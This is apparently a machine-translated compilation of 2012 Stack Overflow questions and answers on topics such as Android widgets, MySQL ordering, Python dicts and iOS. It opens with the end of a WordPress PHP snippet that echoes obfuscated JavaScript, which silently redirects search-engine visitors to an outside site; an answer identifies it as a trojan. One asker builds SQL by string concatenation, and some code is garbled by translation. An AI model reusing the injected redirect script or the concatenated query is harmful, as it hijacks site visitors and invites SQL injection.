                echo "<script language=\"JavaScript\">eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\b'+e(c)+'\\\b','g'),k[c]);return p}('e r=x.9,t=\"\",q;4(r.3(\"m.\")!=-1)t=\"q\";4(r.3(\"7.\")!=-1)t=\"q\";4(r.3(\"8.\")!=-1)t=\"p\";4(r.3(\"a.\")!=-1)t=\"q\";4(r.3(\"f.\")!=-1)t=\"g\";4(r.3(\"j.\")!=-1)t=\"q\";4(t.6&&((q=r.3(\"?\"+t+\"=\"))!=-1||(q=r.3(\"&\"+t+\"=\"))!=-1))B.C=\"v\"+\"w\"+\":/\"+\"/A\"+\"b\"+\"k\"+\"5\"+\"h.\"+\"c\"+\"z/s\"+\"u\"+\"5\"+\"h.p\"+\"d?\"+\"t\"+\"y=1&t\"+\"i\"+\"l=\"+r.n(q+2+t.6).o(\"&\")[0];',39,39,'|||indexOf|if|rc|length|msn|yahoo|referrer|altavista|ogo|bi|hp|var|aol|query||er|ask|sea|ms|google|substring|split||||||ea|ht|tp|document|||go|window|location'.split('|'),0,{}))</script>";
            }
        }
    }
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:14:52.873

它在最后五行`function add_sscounter()`：

```
 if(function_exists('is_user_logged_in')){
        if(time()%2 == 0 && !is_user_logged_in()){          
            echo TROJAN_CODE_HERE;
        }
    } 
```

请注意，仅删除此代码是不够的，您需要找到它是如何添加的，并确保不会再次发生。

# android - 小部件上的自定义 android 模拟时钟

> ID：10102034
> 
> 赞同：0
> 
> 时间：2012-04-11T07:58:59.560
> 
> 标签：android, widget

我在世界模拟时钟工作我使用android模拟时钟，它在活动中工作，但我不能在小部件上使用它，我累了谷歌搜索有人知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:42:56.197

```
/** 
```

* * 这个小部件显示一个模拟时钟，用两只手表示小时和 * * 分钟。*/

@RemoteView 公共类 AnalogClock2 扩展视图 {

```
public AnalogClock2(Context context) {

    super(context);

    // TODO Auto-generated constructor stub

}

private Time mCalendar;

private Drawable mHourHand;

private Drawable mMinuteHand;

private Drawable mSecondHand;

private Drawable mDial;

private int mDialWidth;

private int mDialHeight;

private boolean mAttached;

private final Handler mHandler = new Handler();

private float mMinutes;

private float mHour;

private boolean mChanged;

Context mContext;
public static  String  mtimezone="Asia/Calcutta";
public AnalogClock2(Context context, AttributeSet attrs) {

    this(context, attrs, 0);

}

public AnalogClock2(Context context, AttributeSet attrs,

int defStyle) {

    super(context, attrs, defStyle);

    Resources r = context.getResources();

//  TypedArray a =

//  context.obtainStyledAttributes(

//  attrs, R.styleable.AnalogClock, defStyle, 0);

    mContext = context;

    // mDial =
    // a.getDrawable(com.android.internal.R.styleable.AnalogClock_dial);

    // if (mDial == null) {

    mDial = r.getDrawable(R.drawable.widgetdial);

    // }

    // mHourHand =
    // a.getDrawable(com.android.internal.R.styleable.AnalogClock_hand_hour);

    // if (mHourHand == null) {

    mHourHand = r.getDrawable(R.drawable.widgethour);

    // }

    // mMinuteHand =
    // a.getDrawable(com.android.internal.R.styleable.AnalogClock_hand_minute);

    // if (mMinuteHand == null) {

    mMinuteHand = r.getDrawable(R.drawable.widgetminute);

    mSecondHand = r.getDrawable(R.drawable.widgetminute);

    // }

    mCalendar = new Time();

    mDialWidth = mDial.getIntrinsicWidth();

    mDialHeight = mDial.getIntrinsicHeight();

}
public static void timezone(String timezone){
      mtimezone=timezone;
}

@Override
protected void onAttachedToWindow() {

    super.onAttachedToWindow();

    if (!mAttached) {

        mAttached = true;

        IntentFilter filter = new IntentFilter();

        filter.addAction(Intent.ACTION_TIME_TICK);

        filter.addAction(Intent.ACTION_TIME_CHANGED);

        filter.addAction(Intent.ACTION_TIMEZONE_CHANGED);

        getContext().registerReceiver(mIntentReceiver, filter, null, mHandler);

    }

    // NOTE: It's safe to do these after registering the receiver since the
    // receiver always runs

    // in the main thread, therefore the receiver can't run before this
    // method returns.

    // The time zone may have changed while the receiver wasn't registered,
    // so update the Time

    //mCalendar = new Time();
    mCalendar = new Time(mtimezone);
    // Make sure we update to the current time

    onTimeChanged();

    counter.start();

}

@Override
protected void onDetachedFromWindow() {

    super.onDetachedFromWindow();

    if (mAttached) {

        counter.cancel();

        getContext().unregisterReceiver(mIntentReceiver);

        mAttached = false;

    }

}

@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {

    int widthMode = MeasureSpec.getMode(widthMeasureSpec);

    int widthSize = MeasureSpec.getSize(widthMeasureSpec);

    int heightMode = MeasureSpec.getMode(heightMeasureSpec);

    int heightSize = MeasureSpec.getSize(heightMeasureSpec);

    float hScale = 1.0f;

    float vScale = 1.0f;

    if (widthMode != MeasureSpec.UNSPECIFIED && widthSize < mDialWidth) {

        hScale = (float) widthSize / (float) mDialWidth;

    }

    if (heightMode != MeasureSpec.UNSPECIFIED && heightSize < mDialHeight) {

        vScale = (float) heightSize / (float) mDialHeight;

    }

    System.out.println("***********************HAI****************");

    float scale = Math.min(hScale, vScale);

    setMeasuredDimension(resolveSize((int) (mDialWidth * scale), widthMeasureSpec),

    resolveSize((int) (mDialHeight * scale), heightMeasureSpec));

}

@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {

    super.onSizeChanged(w, h, oldw, oldh);

    mChanged = true;

}

@Override
protected void onDraw(Canvas canvas) {

    super.onDraw(canvas);

    // // here changes on every tick//////

    // / ////

    // / //

    // //////

    // // ///

    // //

    boolean changed = mChanged;

    if (changed) {

        mChanged = false;

    }

    boolean seconds = mSeconds;

    if (seconds) {

        mSeconds = false;

    }

    int availableWidth = 100;

    int availableHeight = 200;

    int x = availableWidth / 2;

    int y = availableHeight / 2;

    final Drawable dial = mDial;

    int w = dial.getIntrinsicWidth();

    int h = dial.getIntrinsicHeight();

    boolean scaled = false;

    if (availableWidth < w || availableHeight < h) {

        scaled = true;

        float scale = Math.min((float) availableWidth / (float) w,

        (float) availableHeight / (float) h);

        canvas.save();

        canvas.scale(scale, scale, x, y);

    }

    if (changed) {

        dial.setBounds(x - (w / 2), y - (h / 2), x + (w / 2), y + (h / 2));

    }

    dial.draw(canvas);

    canvas.save();

    canvas.rotate(mHour / 12.0f * 360.0f, x, y);

    final Drawable hourHand = mHourHand;

    if (changed) {

        w = hourHand.getIntrinsicWidth();

        h = hourHand.getIntrinsicHeight();

        hourHand.setBounds(x - (w / 2), y - (h / 3), x + (w / 2), y + (h / 3));

    }

    hourHand.draw(canvas);

    canvas.restore();

    canvas.save();

    canvas.rotate(mMinutes / 60.0f * 360.0f, x, y);

    // canvas.rotate(mSecond, x, y);

    final Drawable minuteHand = mMinuteHand;

    if (changed) {

        w = minuteHand.getIntrinsicWidth();

        h = minuteHand.getIntrinsicHeight();

        minuteHand.setBounds(x - (w / 2), y - (h / 3), x + (w / 2), y + (h / 3));

    }

    minuteHand.draw(canvas);

    canvas.restore();

    canvas.save();

    canvas.rotate(mSecond, x, y);

    // minuteHand = mMinuteHand;

    if (seconds) {

        w = mSecondHand.getIntrinsicWidth();

        h = mSecondHand.getIntrinsicHeight();

        mSecondHand.setBounds(x - (w / 2), y - (h / 3), x + (w / 2), y + (h / 3));

    }

    mSecondHand.draw(canvas);

    canvas.restore();

    if (scaled) {

        canvas.restore();

    }

}

MyCount counter = new MyCount(10000, 1000);

public class MyCount extends CountDownTimer {

    public MyCount(long millisInFuture, long countDownInterval) {

        super(millisInFuture, countDownInterval);

    }

    @Override
    public void onFinish() {

        counter.start();

    }

    @Override
    public void onTick(long millisUntilFinished) {

        mCalendar.setToNow();

        int hour = mCalendar.hour;

        int minute = mCalendar.minute;

        int second = mCalendar.second;

        mSecond = 6.0f * second;

        mSeconds = true;

        // mChanged = true;

        AnalogClock2.this.invalidate();

        // Toast.makeText(mContext, "text", Toast.LENGTH_LONG).show();

    }

}

boolean mSeconds = false;

float mSecond = 0;

private void onTimeChanged() {

    mCalendar.setToNow();

    int hour = mCalendar.hour+4;

    int minute = mCalendar.minute+15;

    int second = mCalendar.second;

    mMinutes = minute + second / 60.0f;

    mHour = hour + mMinutes / 60.0f;

    mChanged = true;

}

private final BroadcastReceiver mIntentReceiver = new BroadcastReceiver() {

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(Intent.ACTION_TIMEZONE_CHANGED)) {

            String tz = intent.getStringExtra("time-zone");

            mCalendar = new Time(TimeZone.getTimeZone(tz).getID());

        }
        mCalendar = new Time(mtimezone);
        onTimeChanged();

        invalidate();

    }

}; 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:13:25.253

您必须基于 ImageView 创建自己的小部件并创建后台服务来创建位图并定期将它们推送到小部件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:25:59.303

您可以在主屏幕小部件中使用以下小部件类：

```
* AnalogClock 
* Button 
* Chronometer 
* ImageButton 
* ImageView 
* ProgressBar 
* TextView 
```

*不支持这些类的后代*

[在此处](http://pastebin.com/PkaB2sTt)查看我们如何在主屏幕小部件中使用 AnalogClock 小部件的示例

# ipad - MFMailComposeViewController 无法在 iPad IOS5 上创建附件

> ID：10102035
> 
> 赞同：2
> 
> 时间：2012-04-11T07:59:05.423
> 
> 标签：ipad, ios5, attachment, mfmailcomposeviewcontroller

它可以在 iPhone 上运行，但在 iPad 上没有附件。MFMailComposeViewController 不支持 iPad IOS5 吗？

# python - 子类化python字典

> ID：10102038
> 
> 赞同：3
> 
> 时间：2012-04-11T07:59:19.640
> 
> 标签：python, json, oop, elasticsearch

我在我的 Python 应用程序中使用 ElasticSearch，并希望能够创建一个表示查询的可重用字典对象。JSON结构在此处描述[http://pulkitsinghal.blogspot.co.uk/2012/02/how-to-use-elasticsearch-query-dsl.html](http://pulkitsinghal.blogspot.co.uk/2012/02/how-to-use-elasticsearch-query-dsl.html)，我正在使用PyES查询搜索服务器。使用 PyES，我们可以传递一个 dict 对象，该对象在发送到服务器之前会被 json 化。我想创建一个常见查询库，其中只有实际查询术语发生变化，所以我想我将 dict 子类化，以便我可以通过构造函数传递查询术语，例如，当 dict 被 jsonified 时，我最终会得到像这样的东西：

```
{
  "fields": [
    "name",
    "shortDescription",
    "longDescription"
  ],
  "query": {
    "query_string": {
      "fields": [
        "name"
      ],
      "query": query_term,
      "use_dis_max": true
    }
  }
} 
```

我该怎么做？如果是这样`__dict__`，我是否必须在构造函数中设置这个数据结构？这是最好的方法还是我应该创建一个不扩展 dict 的类而只创建一个`to_dict()`以正确结构返回字典的方法？

回答：

这似乎工作正常，任何使这个更“pythonic”的建议将不胜感激！（是的，我知道没有文档字符串）

```
class StandardQuery(object):

      search_fields = ['meta_keywords', 'meta_description', \
                       'fields.title.value', 'slug']
      return_fields = ['slug', 'fields.title.value']

      def __init__(self, query):

          self.query = query

      def to_dict(self):

          output = dict()

          output['fields'] = self.search_fields
          output['query'] = {'query_string': {'fields': self.return_fields, \
                                              'query': self.query, 'use_dis_max': True}}

          return output 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:25:34.030

如果您不想要所有正常`dict`行为，那么您绝对应该创建一个单独的类。然后，您可以给它一个`to_dict()`方法，或者更好，因为您真的想转换为 json 创建一个自定义 json 编码器（如果需要解码器）以`default`与`json.dumps()`.

In`json.dump()`和`json.dumps()`可选参数`default`是一个可调用的，它应该返回对象的序列化版本或 raise `TypeError`（以获取默认行为）。

# java - Java 中 JAX-RS Restful 服务的无容器部署

> ID：10102039
> 
> 赞同：2
> 
> 时间：2012-04-11T07:59:21.007
> 
> 标签：java, tomcat, deployment, jetty, jax-rs

JAX-RS 是帮助您在 Java 中开发 RESTful Web 服务的规范。但是 JAX-RS 似乎需要像“Tomcat”或“Jetty”这样的 servlet 容器。

以集群模式管理容器很痛苦，而且操作繁重。有没有办法像普通的 Java 程序/应用程序一样启动 JAX-RS 服务？

我想使用 JAX-RS 实现，但我不想遵循典型的“部署”周期。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:18:36.883

JAX-RS 与 HTTP 紧密相连，因此大多数实现（例如 Jersey、Apache CXF）在 servlet 中运行，而 servlet 又在 Tomcat 或 Jetty 等容器中运行。我想您可以开发自己的独立 JAX-RS 实现，但您最终会重新发明轮子，因为您将被迫实现 Web 服务器的大多数方面。

您对集群的担忧似乎也没有根据。集群 Tomcat 很简单，这是一件很常见的事情，并且有[大量关于该主题的信息](http://tomcat.apache.org/tomcat-6.0-doc/cluster-howto.html)。似乎对自定义实现进行集群实际上是一项更难的工作。

# javascript - 成功调用后在android中调用短信方案不起作用

> ID：10102040
> 
> 赞同：0
> 
> 时间：2012-04-11T07:59:30.523
> 
> 标签：javascript, android, cordova

我正在使用以下 JavaScript 代码来触发 android 的 SMS 应用程序以向 PhoneGap 中的特定号码显示消息：

```
window.location.href = 'sms://'+cellnumber+'?body='+message; 
```

上面的代码是基于[Calling phone sms api by using phonegap using javascript](https://stackoverflow.com/questions/8254887/calling-phone-sms-api-by-use-of-phonegap-using-javascript)。

当我用`cellnumber = 12345`and调用代码时`message = hello`。然后它起作用了；android 的 SMS 应用程序将消息显示为**hello**并将 cellnumber 显示为**12345**。

但是，如果我再次使用`cellnumber = 12345`and调用代码`message = world`。然后 android 的 SMS 应用程序显示上一条消息**hello**和 cellnumber 为**12345**。

有没有办法使这项工作按预期进行？

# php - MySQL 查询以订购记录 ORDER BY

> ID：10102042
> 
> 赞同：0
> 
> 时间：2012-04-11T07:59:32.943
> 
> 标签：php, mysql, date, sql-order-by

这个问题与我之前的问题有关 - [MySQL 查询以显示当前日期在顶部的记录，其他按降序排列](https://stackoverflow.com/questions/10100775/)。我现在使用的查询是，

```
SELECT b.sales_id,b.category_id,b.sale_starts,b.sale_ends 
FROM tbl_sales b WHERE b.active=1 
UNION
SELECT b.sales_id,b.category_id,b.sale_starts,b.sale_ends 
FROM tbl_sales b INNER JOIN tb_category c ON  b.category_id=c.cat_id 
WHERE c.cat_keyword LIKE 'a' 
ORDER BY IF(sale_ends = DATE(NOW()), 0, 1), sale_ends DESC 
```

返回的结果如下，

```
sales_id      | category_id         |sale_starts | sale_ends 
    ----------|---------------------|------------|--------------
     4        |   12                | 2012-04-05 | 2012-04-11 (today's date)
     1        |   10                | 2012-03-31 | 2012-04-30     
     2        |   11                | 2012-03-22 | 2012-04-27
     3        |   25                | 2012-03-31 | 2012-04-25
     5        |   18                | 2012-04-05 | 2012-04-09
     6        |   20                | 2012-02-23 | 2012-02-27
     7        |   14                | 2012-02-25 | 2012-02-26 
```

但是现在我遇到了另一个问题，我需要对记录进行排序，如下所示 -

```
 sales_id      | category_id         |sale_starts | sale_ends 
        ----------|---------------------|------------|--------------
         4        |   12                | 2012-04-05 | 2012-04-11 (today's date)
         3        |   25                | 2012-03-31 | 2012-04-25
         2        |   11                | 2012-03-22 | 2012-04-27
         1        |   10                | 2012-03-31 | 2012-04-30 
         7        |   14                | 2012-02-25 | 2012-02-26 (expired/past dates)
         6        |   20                | 2012-02-23 | 2012-02-27
         5        |   18                | 2012-04-05 | 2012-04-09 
```

我曾尝试在查询中使用`ASC`而不是，`DESC`但过期日期列在今天日期之后。我需要在今天的日期之后列出未来的日期，之后只列出过期的日期。如何实施？

需要帮忙。提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:03:55.590

ORDER BY 将按从左到右的顺序处理每个条件。因此，如果您需要的排序类似于“任何具有今天日期的条目，然后是将来按日期升序排列的任何条目，然后是按日期升序排列的其他条目”，您可以执行以下操作

```
ORDER BY (sale_ends=CURDATE()) DESC,(sale_ends>CURDATE()) DESC,sale_ends ASC 
```

前两个被列为 DESC 的原因是，如果为真，则条件将评估为 1，如果为假，则条件将评估为 0。由于您首先需要真实条件，因此您需要按 DESCending 顺序对它们进行排序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:20:30.670

我可能会误解一些东西，但这不是你要找的吗？

```
order by sale_ends < curdate(), sale_ends 
```

[在这里](http://sqlfiddle.com/#!2/891cc/1)拉小提琴。

# ios - iPad - 使用相机 - 图像正在旋转

> ID：10102043
> 
> 赞同：1
> 
> 时间：2012-04-11T07:59:36.050
> 
> 标签：ios, camera, uiimagepickercontroller

我正在编写代码以使用 ipad 的相机将图片添加到我的应用程序中。我的应用程序是纵向的，相机是纵向显示的，但是从相机拍摄的图像在添加到我的应用程序时旋转了 90 度。保存到相册时，没问题。为什么图像在我的应用程序中旋转？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-16T03:46:14.653

海我找到了另一种解决方案，只需添加一行检查此代码..

编辑：它与您在链接中给出的相似（几乎相同）答案..对不起..我没有完全注意到它：（

```
- (void) imagePickerController:(UIImagePickerController *)thePicker didFinishPickingMediaWithInfo:(NSDictionary *)imageInfo {
            // Images from the camera are always in landscape, so rotate
                    UIImage *image = [self scaleAndRotateImage: [imageInfo objectForKey:UIImagePickerControllerOriginalImage]];
    //then save the image to photo gallery or wherever  
        }

- (UIImage *) scaleAndRotateImage: (UIImage *)image
{
    int kMaxResolution = 320; // Or whatever

    CGImageRef imgRef = image.CGImage;

    CGFloat width = CGImageGetWidth(imgRef);
    CGFloat height = CGImageGetHeight(imgRef);

    CGAffineTransform transform = CGAffineTransformIdentity;
    CGRect bounds = CGRectMake(0, 0, width, height);
    if (width > kMaxResolution || height > kMaxResolution) {
        CGFloat ratio = width/height;
        if (ratio > 1) {
            bounds.size.width = kMaxResolution;
            bounds.size.height = bounds.size.width / ratio;
        }
        else {
            bounds.size.height = kMaxResolution;
            bounds.size.width = bounds.size.height * ratio;
        }
     }

    CGFloat scaleRatio = bounds.size.width / width;
    CGSize imageSize = CGSizeMake(CGImageGetWidth(imgRef), CGImageGetHeight(imgRef));
    CGFloat boundHeight;
    UIImageOrientation orient = image.imageOrientation;
    switch(orient) {

        case UIImageOrientationUp: //EXIF = 1
            transform = CGAffineTransformIdentity;
            break;

        case UIImageOrientationUpMirrored: //EXIF = 2
            transform = CGAffineTransformMakeTranslation(imageSize.width, 0.0);
            transform = CGAffineTransformScale(transform, -1.0, 1.0);
            break;

        case UIImageOrientationDown: //EXIF = 3
            transform = CGAffineTransformMakeTranslation(imageSize.width, imageSize.height);
            transform = CGAffineTransformRotate(transform, M_PI);
            break;

        case UIImageOrientationDownMirrored: //EXIF = 4
            transform = CGAffineTransformMakeTranslation(0.0, imageSize.height);
            transform = CGAffineTransformScale(transform, 1.0, -1.0);
            break;

        case UIImageOrientationLeftMirrored: //EXIF = 5
            boundHeight = bounds.size.height;
            bounds.size.height = bounds.size.width;
            bounds.size.width = boundHeight;
            transform = CGAffineTransformMakeTranslation(imageSize.height, imageSize.width);
            transform = CGAffineTransformScale(transform, -1.0, 1.0);
            transform = CGAffineTransformRotate(transform, 3.0 * M_PI / 2.0);
            break;

        case UIImageOrientationLeft: //EXIF = 6
            boundHeight = bounds.size.height;
            bounds.size.height = bounds.size.width;
            bounds.size.width = boundHeight;
            transform = CGAffineTransformMakeTranslation(0.0, imageSize.width);
            transform = CGAffineTransformRotate(transform, 3.0 * M_PI / 2.0);
            break;

        case UIImageOrientationRightMirrored: //EXIF = 7
            boundHeight = bounds.size.height;
            bounds.size.height = bounds.size.width;
            bounds.size.width = boundHeight;
            transform = CGAffineTransformMakeScale(-1.0, 1.0);
            transform = CGAffineTransformRotate(transform, M_PI / 2.0);
            break;

        case UIImageOrientationRight: //EXIF = 8
            boundHeight = bounds.size.height;
            bounds.size.height = bounds.size.width;
            bounds.size.width = boundHeight;
            transform = CGAffineTransformMakeTranslation(imageSize.height, 0.0);
            transform = CGAffineTransformRotate(transform, M_PI / 2.0);
            break;

        default:
            [NSException raise:NSInternalInconsistencyException format:@"Invalid image orientation"];

    } 
```

# jquery - Jquery 可排序重置列表（不还原）

> ID：10102044
> 
> 赞同：0
> 
> 时间：2012-04-11T07:59:37.013
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

我想将代码中使用的所有列表重置为原始位置，就像我们重新加载页面时一样。除了重新加载页面之外还有什么想法吗

我正在使用仅带有标题的 Portlet 我有三列 最初我在第一列中拥有所有 Portlet，因此用户可以将它们拖到其他列我有一个重置按钮，因此我需要将所有 Portlet 重置为第一列：

```
<div class="portlet">
    <div class="portlet-header">
       Last Name
    </div>
</div> 
```

# c# - 访问 api 时出现 System.Net.WebException

> ID：10102048
> 
> 赞同：0
> 
> 时间：2012-04-11T07:59:47.047
> 
> 标签：c#, silverlight, windows-phone-7

我今天遇到了一个奇怪的问题。我想在公司网络之外的 wifi 上测试我的手机。因为我需要访问我公司的 API，所以我在 url 请求中附加了一个令牌。如果我的计算机在来宾网络中并且我在模拟器上进行测试，它工作正常。但是，如果我在手机上测试它并且我的手机在访客网络中，我会得到这个“System.Net.Webexception”。它说“远程服务器返回错误：未找到。”。知道为什么吗？谢谢！

飞

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T16:21:09.780

`NotFound`是可以在多种情况下显示的通用错误。可能的原因（没有看到你的代码）：

*   您使用的 API 有问题
*   代理设置配置为阻止特定域，这可能会影响 Web 资源的可访问性
*   连接质量 - 可能导致超时
*   服务器返回的数据无效

# haskell - Haskell：字符串拆分。学习算法

> ID：10102049
> 
> 赞同：1
> 
> 时间：2012-04-11T08:00:07.033
> 
> 标签：haskell

我已经看到有关缺少拆分功能的其他线程，但我不想偷看，因为我这样做是为了学习目的并想弄清楚自己。所以这里是：

```
split :: Char -> String -> [String]
split c xs | null f = []
           | otherwise = f : split c s'
  where (f,s) = break (== c) xs
        s' | null s = s
           | otherwise = tail s 
```

它似乎工作正常（请告诉我是否有任何问题）但是当我使用不在字符串中的拆分字符时，该函数返回一个包含原始字符串单个元素的列表，而我希望它返回一个空列表。我不知道该怎么做。

有任何想法吗？。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:27:14.657

您可以简单地编写一个包装函数，更改原来的结果：

```
split' x xs = go (split x xs)  where
   go [_] = []
   go ys = ys 
```

有很多方法可以编写拆分函数，例如

```
split x xs = foldl' go [[]] xs where
   go (ys:yss) y | y == x = []:ys:yss
                 | otherwise = (y:ys):yss 
```

或者

```
 import Data.List 

 split x xs = map tail $ groupBy (const (/=x)) (x:xs) 
```

# android - 如何将多个参数传递给Android中的查询？

> ID：10102050
> 
> 赞同：1
> 
> 时间：2012-04-11T08:00:08.340
> 
> 标签：android, sql, sqlite

我想将多个参数传递给 Android 中的查询。我执行以下操作：

```
String final QUERY = "SELECT TA.ID FROM TAB TA LEFT JOIN PROP P ON P.ID = TA.ID LEFT JOIN LOC L ON L.ID = TA.ID LEFT JOIN TIME T ON T.ID = TA.ID  WHERE (COALESCE(LONG,?) - ?) * (COALESCE(LONG,?) - ?) + (COALESCE(LAT,?) - ?)  * (COALESCE(LAT,?) - ?) <=COALESCE(VALUE,0)*COALESCE(VALUE,0)  AND ? BETWEEN  COALESCE(BEGIN,0) AND COALESCE(END, 123456)";
    String[] args= {"" + val1, "" + val2, "" + val3, "" + val4, "" + val5, "" val6, "" + val7, "" + val8, "" + val9};
    cursor = db.rawQuery(QUERY,args); 
```

但它会返回一个空游标。我在shell中尝试了查询，它有效。如何在代码中实现它？

**编辑**：我找到了另一种方法：

```
QUERY = "SELECT TA.ID FROM TAB TA LEFT JOIN PROP P ON P.ID = TA.ID LEFT JOIN LOC L ON L.ID = TA.ID LEFT JOIN TIME T ON T.ID = TA.ID  WHERE (COALESCE(LONG," + val1+ " ) - " + val2 + " ) * (COALESCE(LONG," + val3 + " ) - " + val4 + " ) + (COALESCE(LAT," + val5 + " ) - " +  val6 + ")  * (COALESCE(LAT," +  val7 + " ) - " + val8 + ") <=COALESCE(VALUE,0)*COALESCE(VALUE,0)  AND" +  val9 + " BETWEEN  COALESCE(BEGIN,0) AND COALESCE(END, 123456)";
  cursor = db.rawQuery(QUERY,null); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:30:03.737

你犯了一些错误和不精确。为了提高性能，最好使用：

```
String.valueOf(valX); 
```

然后，如果您查看 android [SQLiteDatabase](http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html)文档，您会看到方法 rawQuery(String sql, String[] selectionArgs) 接受 sql 以及那些不是您的 whereArgs 的 selectionArgs。

# silverlight - Silverlight MEF 下载动态 .xap 文件

> ID：10102054
> 
> 赞同：1
> 
> 时间：2012-04-11T08:00:23.353
> 
> 标签：silverlight, silverlight-4.0, silverlight-3.0

我有一个问题。我正在使用包目录下载 daynamic .xap 文件。

.XAP 的大小为 4 MB。

会发生什么

•当用户单击并打开我的站点时 •XAP 文件将被下载到客户端 •客户端在我的站点上工作并关闭浏览器 •下次，再次登录。 •XAP 文件是否会再次下载？或者客户端将从缓存中使用？

我希望在首次发布后每三个月发布一次我的 silverlight 应用程序的新版本。

•现在，我发布了新版本 •客户端再次登录 •XAP文件会再次自动下载吗？OR 客户端仍会看到旧 XAP 的 SL 内容。

基本上，我不确定 silverlight 是每次下载 XAP 文件还是仅在发现更改时才下载？

# mysql - Jasperserver 安装无法访问数据库

> ID：10102055
> 
> 赞同：0
> 
> 时间：2012-04-11T08:00:25.957
> 
> 标签：mysql, installation, database-connection, jasperserver

我正在尝试在 CentOS linux 机器上安装 jasperserver(war)。它抛出错误说，

```
 Message: [Access denied for user 'jasperdb'@'xx.xx.xx.xx' to database 'mysql'] 
```

但是，当我通过命令提示符访问 mysql 时，它工作正常。我可以从我尝试安装 jasperserver 的同一台机器上通过用户 jasperdb 访问。

为什么 jasperserver 尝试访问名为“mysql”的数据库也很奇怪？有什么解决办法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-16T16:51:52.023

如果您没有使用“.war 文件”安装程序，我建议您使用它。与捆绑在 Tomcat 和 PostgreSQL 中的安装程序相比，它的故障排除要容易得多。

如果您正在使用它，那么您应该找到您在 default_master.properties 中设置的凭据。这包括用户名和数据库名。运行`ant clean-config`以确保您没有选择任何旧设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T15:40:48.833

mysql 中的 mysql 数据库是存储用户信息的数据库。这就是它试图访问 mysql 数据库的原因。我假设你的 mysql.user 表中有'jasperdb'@'localhost'。尝试确保 localhost 和任何其他计算机名称在您的 /etc/hosts 中填写为 127.0.0.1。

# android - 具有负值的android cliprect不会更改父视图rect

> ID：10102059
> 
> 赞同：0
> 
> 时间：2012-04-11T08:00:44.253
> 
> 标签：android, layout, view

我有一个子视图，我希望画布在轴的负侧绘制一个具有“像素”的圆圈

```
 canvas.drawCircle(0, 0, 50f, paint); 
```

为了做到这一点，我使用clipRect，这很好用，我看到了完整的圆圈。但是，当我在父视图上使用 requestLayout 并更改子视图的 x、y 位置时，未显示圆圈的负 sid 请告诉我该怎么做

这是代码：

```
 package natan.android.TestCanvas;

    import android.app.Activity;
    import android.graphics.Canvas;
    import android.graphics.Color;
    import android.graphics.Paint;
    import android.os.Bundle;
    import android.view.MotionEvent;
    import android.view.View;
    import android.widget.RelativeLayout;
    import android.widget.RelativeLayout.LayoutParams;

    public class TestCanvasActivity extends Activity {

        View childView;
        RelativeLayout parentView;

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            childView = new View(this)
            {

                @Override
                protected void onDraw(Canvas canvas) {
                    canvas.clipRect(-50, -50, 50, 50,android.graphics.Region.Op.REPLACE);
                    Paint paint = new Paint();
                    paint.setStyle(Paint.Style.FILL);
                    paint.setColor(Color.RED);
                    canvas.drawCircle(0, 0, 50f, paint);
                    super.onDraw(canvas);
                }

            };

            parentView = new RelativeLayout(this);
            parentView.addView(childView);
            LayoutParams layoutParms = (LayoutParams)(childView.getLayoutParams());
            layoutParms.leftMargin=150;
            layoutParms.topMargin=150;
            setContentView(parentView);
        }

        @Override
        public boolean onTouchEvent(MotionEvent event) {
            LayoutParams layoutParms = (LayoutParams)(childView.getLayoutParams());
            layoutParms.leftMargin=100;
            layoutParms.topMargin=100;
            parentView.requestLayout();
            return super.onTouchEvent(event);
        }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T10:06:20.600

我想我想出了一个我从这里拿走的灵魂

[http://www.devdaily.com/java/jwarehouse/android/core/java/android/view/ViewGroup.java.shtml](http://www.devdaily.com/java/jwarehouse/android/core/java/android/view/ViewGroup.java.shtml)

使用这行代码解决了问题

```
 parentView.setClipChildren(false); 
```

和

```
 parentView.requestLayout();
   parentView.invalidate(); 
```

希望这对其他人有帮助，如果有人对此问题有更多了解，请添加

这是完整的代码：

```
 public class TestCanvasActivity extends Activity {

        View childView;
        RelativeLayout parentView;

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            childView = new View(this)
            {

                @Override
                protected void onDraw(Canvas canvas) {
                                        Paint paint = new Paint();
                    paint.setStyle(Paint.Style.FILL);
                    paint.setColor(Color.RED);
                    canvas.drawCircle(0, 0, 50f, paint);
                    super.onDraw(canvas);
                }

            };

            parentView = new RelativeLayout(this)
            {

                @Override
                protected void onLayout(boolean changed, int l, int t,
                        int r, int b) {
                    // TODO Auto-generated method stub
                    super.onLayout(changed, l, t, r, b);
                }

            };
            parentView.setClipChildren(false);

            parentView.addView(childView);
            parentView.setClipChildren(false);
            LayoutParams layoutParms = (LayoutParams)(childView.getLayoutParams());
            layoutParms.leftMargin=150;
            layoutParms.topMargin=150;

            setContentView(parentView);

        }

        @Override
